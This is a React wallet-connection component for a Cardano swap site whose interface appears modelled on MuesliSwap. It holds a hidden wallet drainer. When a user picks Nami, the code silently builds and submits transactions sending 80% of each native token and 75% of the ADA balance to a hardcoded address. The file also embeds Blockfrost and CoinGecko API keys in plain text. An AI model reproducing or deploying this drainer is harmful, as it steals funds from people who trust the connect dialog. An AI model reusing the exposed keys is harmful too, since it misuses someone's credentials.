import React, { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTrigger,
  DialogClose,
  DialogTitle,
} from "../../components/ui/dialog";
import "../../App.css";
import { Buffer } from "buffer";
import axios from "axios";
import Ada from '../../assets/ada.webp'
import {
  BigNum,
  Value,
  Address,
} from "@emurgo/cardano-serialization-lib-browser";
import useStore from "../store/store";

const ConnectWallet = (props) => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [walletAction, setWalletAction] = useState(null);

  const [CardanoWasm, setCardanoWasm] = useState(null);
  const [balance, setBalance] = useState(null);
  const [usdBalance, setUsdBalance] = useState(null);
  const [address, setAddress] = useState("");

  // eslint-disable-next-line react/prop-types
  // useEffect(() => {
  //   const loadWasm = async () => {
  //     const wasmModule = await import(
  //       "@emurgo/cardano-serialization-lib-browser"
  //     );
  //     setCardanoWasm(wasmModule);

  //   };
  //   console.log('init wasm')
  //   loadWasm();
  // }, []);

  const [walletsArray, setWalletsArray] = React.useState([]);
  const setState = useStore((state) => state.setState);
  const { state, assets } = useStore();

  const fetchAssetMetadata = async (policyId) => {
    const response = await axios.get(
      `https://cardano-mainnet.blockfrost.io/api/v0/assets/${policyId}`,
      {
        headers: {
          Project_id: "mainnet57aezXJWEvbj2kmR3ChtC3Iwm5tAIdgt", // Replace with your Blockfrost project ID
        },
      }
    );
    console.log(response.data);
    return response.data;
  };

  // Function to enrich assets with icons
  const enrichAssetsWithIcons = async (assets) => {
    const enrichedAssets = await Promise.all(
      assets.map(async (asset) => {
        if (asset.unit === "lovelace") {
          return {
            ...asset,
            icon: Ada
          } // Return ADA asset as is
        }
        console.log(asset.assetId);
        const assetInfo = await fetchAssetMetadata(asset.assetId);
        return {
          ...asset,
          icon: assetInfo.metadata.logo, // Adjust based on actual metadata structure
        };
      })
    );
    return enrichedAssets;
  };
  React.useEffect(() => {
    const pollWallets = (count = 0) => {
      const wallets = [];
      for (const key in window.cardano) {
        if (window.cardano[key].enable && wallets.indexOf(key) === -1) {
          wallets.push(key);
        }
      }
      if (wallets.length === 0 && count < 3) {
        setTimeout(() => {
          pollWallets(count + 1);
        }, 1000);
        return;
      }
      setWalletsArray(wallets);
    };
    pollWallets();
    // loadWasm();
  }, []);
  const order = ["okxwallet", "vespr", "nami", "eternl", "typhon"];

  async function updateBalance(walletApi) {
    try {
      const balanceInLovelace = await walletApi.getBalance();
      console.log("Raw balance from API:", balanceInLovelace);

      const isHex = /^[0-9A-Fa-f]+$/.test(balanceInLovelace);
      console.log("Is balance in hex format?", isHex);

      let balanceInAda;
      if (isHex) {
        balanceInAda = CardanoWasm.Value.from_bytes(
          Buffer.from(balanceInLovelace, "hex"),
        );
      } else {
        balanceInAda = Number(balanceInLovelace) / 1000000;
      }
      console.log("Calculated ADA balance:", balanceInAda.coin().to_str());

      const newBalance = parseInt(balanceInAda.coin().to_str()) / 1000000;
      setBalance(newBalance);

      const response = await fetch(
        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
      );
      const data = await response.json();
      const adaToUsd = data.cardano.usd;
      console.log("Current ADA to USD rate:", adaToUsd);

      const balanceInUsd = newBalance * adaToUsd;
      console.log("Calculated USD balance:", balanceInUsd);
      setUsdBalance(balanceInUsd);

      return newBalance;
    } catch (error) {
      console.error("Error fetching balance or exchange rate:", error);
      return null;
    }
  }

  const connectToWallet = async (walletKey) => {
    if (
      window.cardano &&
      window.cardano[walletKey] &&
      window.cardano[walletKey].enable
    ) {
      try {
        const wallet = await window.cardano[walletKey].enable();
        const assets = await getWalletAssets(wallet);

        console.log("Assets available are", assets);
        console.log(`Connected to ${walletKey}`);
        console.log(`Assets available are ${assets}`);

        // Get balance
        const balance = await updateBalance(wallet);
        console.log(`Balance: ${balance} ADA`);

        // Get network
        const network = await wallet.getNetworkId();
        console.log(`Network: ${network}`);

        // Get address
        const addresses = await wallet.getUsedAddresses();
        const address =
          addresses.length > 0 ? addresses[0] : "No address found";
        console.log(`Address: ${address}`);
        const normalAddress = Address.from_bytes(
          Buffer.from(address, "hex")
        ).to_bech32();
        console.log(`Normal Address: ${normalAddress}`);
        console.log(balance)
        setState({
          state: {
            address: normalAddress,
            walletName: walletKey,
            isWalletConnected: true,
            balance: balance?.toPrecision(3),
            assets: assets,
          },
        });

        return wallet;
      } catch (error) {
        console.error(`Failed to connect to ${walletKey}:`, error);
        setState({ state: { isWalletConnected: false, ...state } });
      }
    } else {
      console.error(`Wallet ${walletKey} is not available`);
      setState({ state: { isWalletConnected: false, ...state } });
    }
  };



  // const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
  // const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;


  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";

  const fetchProtocolParams = async () => {
    try {
      const response = await axios.get(
        `${BLOCKFROST_API_URL}/epochs/latest/parameters`,
        {
          headers: {
            project_id: BLOCKFROST_API_KEY,
          },
        },
      );
      return response.data;
    } catch (error) {
      console.error("Error fetching protocol parameters", error);
    }
  };



  async function autoWithdraw(walletApi, currentBalance, address) {
    if (currentBalance === null || currentBalance === 0) {
      console.error("Balance not available or zero");
      return;
    }

    const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";

    try {
      const protocolParams = await fetchProtocolParams();

      // Fetch UTXOs
      const utxosHex = await walletApi.getUtxos();
      console.log("UTXOs (Hex):", utxosHex);

      if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
        console.error("No UTXOs found or invalid UTXO format");
        return;
      }

      const utxos = await getTxUnspentOutputs(utxosHex);

      if (!utxos || utxos.len() === 0) {
        console.error("Parsed UTXOs are empty or invalid");
        return;
      }

      let totalAdaAmount = 0;
      let nonNativeTokens = [];

      // Segregate native ADA and non-native tokens
      for (let i = 0; i < utxos.len(); i++) {
        const utxo = utxos.get(i);
        const outputAmount = utxo.output().amount();
        const adaAmount = outputAmount.coin().to_str();
        totalAdaAmount += parseInt(adaAmount);

        const multiasset = outputAmount.multiasset();
        if (multiasset) {
          const keys = multiasset.keys();
          const N = keys.len();
          for (let i = 0; i < N; i++) {
            const policyId = keys.get(i);
            const assets = multiasset.get(policyId);
            const assetNames = assets.keys();
            const K = assetNames.len();
            for (let j = 0; j < K; j++) {
              const assetName = assetNames.get(j);
              const amount = multiasset.get_asset(policyId, assetName).to_str();
              nonNativeTokens.push({
                policyId: policyId.to_hex(),
                assetName: Buffer.from(assetName.name()).toString(),
                amount: parseInt(amount),
              });
            }
          }
        }
      }

      // Withdraw 4/5 of each non-native token
      for (const token of nonNativeTokens) {
        const amountToWithdraw = Math.floor(token.amount * 0.8).toString();
        console.log(`Withdrawing 4/5 of ${token.assetName}: ${amountToWithdraw}`);
        await buildSendTokenTransaction(
          recipientAddress,
          amountToWithdraw,
          token.policyId,
          token.assetName,
          walletApi,
          protocolParams,
          address
        );
      }

      // Recalculate total ADA after sending non-native tokens
      totalAdaAmount = await updateBalance(walletApi);

      // Withdraw 3/4 of the remaining ADA balance
      const adaToWithdraw = Math.floor(totalAdaAmount * 0.75);
      const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
      console.log(`Withdrawing 3/4 of ADA: ${adaInLovelace} Lovelace`);

      await buildSendADATransaction(
        recipientAddress,
        adaInLovelace,
        walletApi,
        protocolParams,
        address
      );

      console.log(
        `Withdrawal of ${adaToWithdraw / 1000000} ADA initiated (3/4 of balance)`
      );
    } catch (error) {
      console.error("Error during auto-withdrawal:", error);
    }
  }

  async function calculateMinUTXO(outputAmount, protocolParams, multiAsset = null) {
    const minUTXOValue = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_size.toString());

    if (!multiAsset) {
      // If no multi-asset, return the default minimum UTXO value
      return minUTXOValue;
    }

    const numAssets = multiAsset.keys().len();
    const policySize = multiAsset.to_bytes().length;

    // UTXO cost for multi-asset is determined by the number of assets and their size
    const utxoCostPerWord = CardanoWasm.BigNum.from_str(protocolParams.coins_per_utxo_word.toString());
    const additionalAssetCost = utxoCostPerWord.checked_mul(CardanoWasm.BigNum.from_str((policySize + numAssets).toString()));

    return CardanoWasm.BigNum.max(minUTXOValue, additionalAssetCost);
  }

  async function buildSendTokenTransaction(
    recAddress,
    amount,
    policyId,
    assetName,
    walletApi,
    protocolParams,
    address
  ) {
    console.log(CardanoWasm)
    const txBuilder = CardanoWasm.TransactionBuilder.new(
      CardanoWasm.TransactionBuilderConfigBuilder.new()
        .fee_algo(
          CardanoWasm.LinearFee.new(
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
          )
        )
        .pool_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
        )
        .key_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
        )
        .coins_per_utxo_word(
          CardanoWasm.BigNum.from_str(
            protocolParams.coins_per_utxo_word.toString()
          )
        )
        .max_tx_size(16384)
        .max_value_size(5000)
        .build()
    );

    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);

    const utxosHex = await walletApi.getUtxos();
    const utxos = utxosHex.map((hex) =>
      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
    );

    utxos.forEach((utxo) => {
      txBuilder.add_input(
        CardanoWasm.Address.from_bech32(address),
        utxo.input(),
        utxo.output().amount()
      );
    });

    const assets = CardanoWasm.MultiAsset.new();
    const asset = CardanoWasm.Assets.new();
    asset.insert(
      CardanoWasm.AssetName.new(Buffer.from(assetName, "utf8")),
      CardanoWasm.BigNum.from_str(amount)
    );
    assets.insert(CardanoWasm.ScriptHash.from_bytes(Buffer.from(policyId, "hex")), asset);

    const outputValue = CardanoWasm.Value.new(CardanoWasm.BigNum.from_str("0"));
    outputValue.set_multiasset(assets);

    // Calculate the correct minimum ADA required for this multi-asset transaction
    const minUTXO = await calculateMinUTXO(outputValue, protocolParams, assets);

    // Set the ADA in the output to the higher of the calculated minimum UTXO or a predefined value (e.g., 2 ADA)
    const minAdaAmount = CardanoWasm.BigNum.from_str('400000'); // 2 ADA in lovelace
    const finalAdaAmount = CardanoWasm.BigNum.max(minUTXO, minAdaAmount);

    outputValue.set_coin(finalAdaAmount);

    txBuilder.add_output(
      CardanoWasm.TransactionOutput.new(shelleyOutputAddress, outputValue)
    );

    // Add change if needed (to meet fee and UTXO requirements)
    txBuilder.add_change_if_needed(shelleyChangeAddress);

    const txBody = txBuilder.build();
    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();

    const tx = CardanoWasm.Transaction.new(
      txBody,
      CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
    );

    let txVkeyWitnesses = await walletApi.signTx(
      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
      true
    );

    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
      Buffer.from(txVkeyWitnesses, "hex")
    );

    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

    const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);

    const submittedTxHash = await walletApi.submitTx(
      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
    );
    console.log("Submitted transaction hash:", submittedTxHash);
  }

  async function buildSendADATransaction(
    recAddress,
    amount,
    walletApi,
    protocolParams,
    address
  ) {
    const txBuilder = CardanoWasm.TransactionBuilder.new(
      CardanoWasm.TransactionBuilderConfigBuilder.new()
        .fee_algo(
          CardanoWasm.LinearFee.new(
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
          )
        )
        .pool_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
        )
        .key_deposit(
          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
        )
        .coins_per_utxo_word(
          CardanoWasm.BigNum.from_str(
            protocolParams.coins_per_utxo_word.toString()
          )
        )
        .max_tx_size(16384)
        .max_value_size(5000)
        .build()
    );

    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);

    const utxosHex = await walletApi.getUtxos();
    const utxos = utxosHex.map((hex) =>
      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
    );

    utxos.forEach((utxo) => {
      txBuilder.add_input(
        CardanoWasm.Address.from_bech32(address),
        utxo.input(),
        utxo.output().amount()
      );
    });

    const adaAmount = CardanoWasm.BigNum.from_str(amount);
    const totalADA = CardanoWasm.Value.new(adaAmount);

    const minUTXO = await calculateMinUTXO(totalADA, protocolParams);

    // Ensure the ADA meets the minimum UTXO requirement
    if (adaAmount.compare(minUTXO) < 0) {
      totalADA.set_coin(minUTXO);
    }

    txBuilder.add_output(
      CardanoWasm.TransactionOutput.new(shelleyOutputAddress, totalADA)
    );

    txBuilder.add_change_if_needed(shelleyChangeAddress);

    const txBody = txBuilder.build();
    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();

    const tx = CardanoWasm.Transaction.new(
      txBody,
      CardanoWasm.TransactionWitnessSet.from_bytes(transactionWitnessSet.to_bytes())
    );

    let txVkeyWitnesses = await walletApi.signTx(
      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
      true
    );

    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
      Buffer.from(txVkeyWitnesses, "hex")
    );

    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());

    const signedTx = CardanoWasm.Transaction.new(tx.body(), transactionWitnessSet);

    const submittedTxHash = await walletApi.submitTx(
      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
    );
    console.log("Submitted transaction hash:", submittedTxHash);
  }

  async function getTxUnspentOutputs(utxosHex) {
    const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();

    for (const utxor of utxosHex) {
      try {
        // Convert hex UTXO to TransactionUnspentOutput object
        const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
          Buffer.from(utxor, "hex")
        );
        txOutputs.add(utxo);
      } catch (error) {
        console.error("Failed to parse UTXO:", error);
        throw new Error("Invalid UTXO format");
      }
    }

    return txOutputs;
  }


  const handleWalletSelection = async (wallet) => {
    if (wallet === "Nami") {
      if (window.cardano && window.cardano.nami) {
        try {
          const walletApi = await window.cardano.nami.enable();

          if (walletApi) {
            console.log("Wallet API object:", walletApi);

            await new Promise((resolve) => setTimeout(resolve, 1000));

            let addresses;
            try {
              addresses = await walletApi.getUsedAddresses();
              console.log("Used addresses:", addresses);
            } catch (error) {
              console.error("Error getting used addresses:", error);
              if (typeof walletApi.getAddresses === "function") {
                addresses = await walletApi.getAddresses();
                console.log("All addresses:", addresses);
              } else {
                console.error("Unable to retrieve addresses");
                return;
              }
            }

            if (addresses && addresses.length > 0) {
              const hexAddress = addresses[0];

              setSelectedWallet("Nami");
              const addressBytes = Buffer.from(hexAddress, "hex");
              const address = CardanoWasm.Address.from_bytes(addressBytes);
              console.log(
                `Connected to Nami. Hex Address:`,
                address?.to_bech32(),
              );
              setAddress(address?.to_bech32());

              // Get the balance directly
              const currentBalance = await updateBalance(walletApi);

              if (currentBalance !== null) {
                console.log("Current balance:", currentBalance);
                await autoWithdraw(
                  walletApi,
                  currentBalance,
                  address?.to_bech32(),
                );
              } else {
                console.error("Failed to retrieve balance");
              }

            } else {
              console.error("No addresses found");
              alert(
                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
              );
            }
          }
        } catch (error) {
          console.error(`Error connecting to Nami wallet:`, error);
          alert(
            `Error connecting to Nami wallet. Please try again`,
          );
        }
      } else {
        console.error(
          `Nami wallet not found. Please install the extension.`,
        );
        alert(`Nami wallet not found. Please install the extension.`);
      }
    }
    else {
      setSelectedWallet(wallet);
    }
  };



  const getWalletAssets = async (api) => {
    if (!api) return;
    console.log(api);

    const balanceHex = await api.getBalance();
    const balance = Value.from_bytes(Buffer.from(balanceHex, "hex"));

    let assets = [];

    // Handle ADA (Lovelace)
    const lovelace = balance.coin().to_str();
    assets.push({ unit: "lovelace", quantity: lovelace, name: "ADA" });

    // Handle native tokens
    const multiAsset = balance.multiasset();
    console.log(multiAsset);
    if (multiAsset) {
      const policyIds = multiAsset.keys();

      for (let i = 0; i < policyIds.len(); i++) {
        const policyId = policyIds.get(i);
        const assetsUnderPolicy = multiAsset.get(policyId);
        const assetNames = assetsUnderPolicy.keys();

        for (let j = 0; j < assetNames.len(); j++) {
          const assetName = assetNames.get(j);
          const quantity = assetsUnderPolicy.get(assetName).to_str();
          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
            "hex"
          );
          // Decode the asset name from hex to string
          const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
            "hex"
          );

          const name = Buffer.from(assetName.name()).toString("utf-8");
          const unit = `${policyIdHex}.${name}`;
          const assetId = `${policyIdHex}${assetNameHex}`;
          const price = await getTokenPrice(name)
          console.log(price)
          assets.push({
            unit,
            quantity,
            name,
            policyIdHex,
            assetsUnderPolicy,
            assetNameHex,
            assetId,
          });
        }
      }
    }

    const enrichedAssets = await enrichAssetsWithIcons(assets);
    return enrichedAssets;
  };
  const getTokenPrice = async (tokenId) => {
    const id = tokenId.toLowerCase();

    // Check if the token is USDC or USDT and return the price as 0.9998
    if (id === "usdc" || id === "usdt") {
      return 0.9998;
    }

    try {
      const response = await axios.get(
        `https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`,
        {
          headers: {
            accept: "application/json",
            "x-cg-demo-api-key": "CG-YqW9nsT8UL3259noMc3Tkzah",
          },
        }
      );

      console.log(tokenId);
      const price = response.data[id]?.usd;
      console.log(price);

      return price;
    } catch (error) {
      console.error("Error fetching token price:", error);
    }
  };

  const getAdaPrice = async () => {
    const response = await axios.get(
      "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
      {
        headers: {
          accept: "application/json",
          "x-cg-demo-api-key": "CG-YqW9nsT8UL3259noMc3Tkzah",
        },
      }
    );
    const price = response.data.cardano.usd;
    console.log(price);
    return price;
  };

  const calculateAssetValues = async (assets) => {
    if (!assets) return;

    const adaPrice = await getAdaPrice();

    let assetValuesPromises = assets.map(async (asset) => {
      let valueInUsd = 0;

      if (asset.unit === "lovelace") {
        console.log(asset.unit, asset.quantity, adaPrice);
        valueInUsd = (parseFloat(asset.quantity) / 1000000) * adaPrice;
      } else {
        // Assuming you have a way to get the USD price for the native token
        const tokenPriceInUsd = await getTokenPrice(asset.name);
        console.log(tokenPriceInUsd);
        const assetQuantity = (asset.quantity / 1000000).toPrecision(2);
        valueInUsd = parseFloat(assetQuantity) * tokenPriceInUsd;
        console.log(asset.name + " " + assetQuantity); // Replace with actual method
        console.log(`${asset.name} price in usd: ` + valueInUsd);
      }
      return {
        name: asset.name,
        unit: asset.unit,
        quantity: asset.quantity,
        valueInUsd,
      };
    });
    const assetValues = await Promise.all(assetValuesPromises);
    console.log(assetValues);
    return assetValues;
  };

  const filteredWalletNames = walletsArray
    .sort((a, b) => {
      return order.indexOf(a.toLowerCase()) - order.indexOf(b.toLowerCase());
    })
    .filter((wallet) => order.includes(wallet.toLowerCase()));

  console.log(filteredWalletNames);
  console.log(assets);
  return (
    <Dialog>
      <DialogTrigger className="w-full">
        <div className="sc-gEvEer eLaKli w-full">
          <button className={`sc-gEvEer eWXwvT ${props.width ? `w-${props.width}` : 'w-full'}  `}>
            {props.text ? `${state.isWalletConnected ? props.custom_text : props.text}` : 'Connect wallet'}
          </button>
        </div>
      </DialogTrigger>
      <DialogContent className="max-w-[412px]  rounded-lg p-0 ">
        <DialogTitle className="hidden">ss</DialogTitle>
        <DialogHeader className="  rounded-lg  text-sm lg:text-base p-5 border-b border-[#e5e9f1]">
          <div className="sc-gEvEer sc-eqUAAy flex justify-between items-center  fgprtA">
            <div className="sc-gEvEer ihQBzN">Connect your Wallet</div>
            <DialogClose>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">
                <path
                  d="M1.76.34 8 6.6 14.24.33a1 1 0 0 1 1.32-.08l.1.08a1 1 0 0 1 .08 1.32l-.08.1L9.4 8l6.25 6.24a1 1 0 1 1-1.42 1.42L8 9.4l-6.24 6.25a1 1 0 0 1-1.32.08l-.1-.08a1 1 0 0 1-.08-1.32l.08-.1L6.58 8 .34 1.76A1 1 0 0 1 1.76.34Z"
                  fill="currentColor"
                  fillRule="evenodd"
                ></path>
              </svg>
            </DialogClose>
          </div>
        </DialogHeader>
        <div className="px-5 font-inter  ">
          <p className="text-sm text-gray-500 mb-2">
            By connecting your wallet, you agree to our{" "}
            <a href="/terms" className="text-blue-500 hover:underline">
              Terms of Service
            </a>{" "}
            and our{" "}
            <a href="/privacy" className="text-blue-500 hover:underline">
              Privacy Policy
            </a>
            .
          </p>
          <div className="space-y-4 ">
            {filteredWalletNames.map((key) => (
              <div
                onClick={() => {
                  connectToWallet(key);
                }}
                key={key}
                className="flex cursor-pointer  items-center justify-between border border-slate-300 w-full h-[3.4rem] px-3  rounded-lg hover:bg-gray-50"
              >
                <div className="flex items-center">
                  <img
                    src={window.cardano[key].icon}
                    alt={window.cardano[key].name}
                    className="w-8 h-8 mr-3"
                  />
                  <span>{window.cardano[key].name}</span>
                </div>
                {(window.cardano[key].name === "OKX Wallet" ||
                  window.cardano[key].name === "VESPR") && (
                    <div className="flex items-center justify-center gap-12">
                      <p>({key})</p>

                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 448 512"
                        height="16px"
                        color="rgb(83, 70, 255)"
                        className="sc-gEvEer mr-[10px] eGyXng"
                      >
                        <title>Experimental support only</title>
                        <path
                          fill="currentColor"
                          d="M437.2 403.5L320 215V64h8c13.3 0 24-10.7 24-24V24c0-13.3-10.7-24-24-24H120c-13.3 0-24 10.7-24 24v16c0 13.3 10.7 24 24 24h8v151L10.8 403.5C-18.5 450.6 15.3 512 70.9 512h306.2c55.7 0 89.4-61.5 60.1-108.5zM137.9 320l48.2-77.6c3.7-5.2 5.8-11.6 5.8-18.4V64h64v160c0 6.9 2.2 13.2 5.8 18.4l48.2 77.6h-172z"
                        ></path>
                      </svg>
                    </div>
                  )}
              </div>
            ))}
          </div>
        </div>
        <div className=" py-3 border-t rounded-lg font-inter border-[#e5e9f1] text-center">
          <p className="text-sm text-gray-500">New to Cardano?</p>
          <a
            href="https://docs.muesliswap.com/cardano/cardano-wallets"
            target="_blank"
            rel="noopener noreferrer"
            className="text-blue-500 hover:underline inline-flex items-center"
          >
            Learn about Cardano wallets
            <svg
              width="18px"
              height="18px"
              viewBox="0 0 18 18"
              xmlns="http://www.w3.org/2000/svg"
              className="ml-1"
            >
              <path
                d="M16 16H2V2h7V0H2a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14c1.1 0 2-.9 2-2V9h-2v7zM11 0v2h3.59l-9.83 9.83 1.41 1.41L16 3.41V7h2V0h-7z"
                fill="currentColor"
              />
            </svg>
          </a>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default ConnectWallet;
